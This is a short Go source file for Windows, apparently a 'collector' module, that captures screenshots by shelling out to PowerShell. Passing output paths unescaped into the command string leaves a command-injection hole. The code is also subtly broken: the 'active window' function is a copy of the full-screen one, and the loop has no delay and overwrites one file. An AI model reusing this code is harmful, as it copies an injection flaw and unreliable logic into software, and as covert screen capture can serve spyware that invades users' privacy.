//go:build windows

package collector

import (
"os/exec"
)

func CaptureScreenshot(outputPath string) bool {
cmd := exec.Command("cmd", "/c", "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $b.Save('"+outputPath+"')\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func CaptureScreenshotLoop(outputPath string, seconds int) bool {
for i := 0; i < seconds; i++ {
CaptureScreenshot(outputPath)
}
return true
}

func CaptureActiveWindow(outputPath string) bool {
cmd := exec.Command("cmd", "/c", "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g = [System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $b.Save('"+outputPath+"')\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}
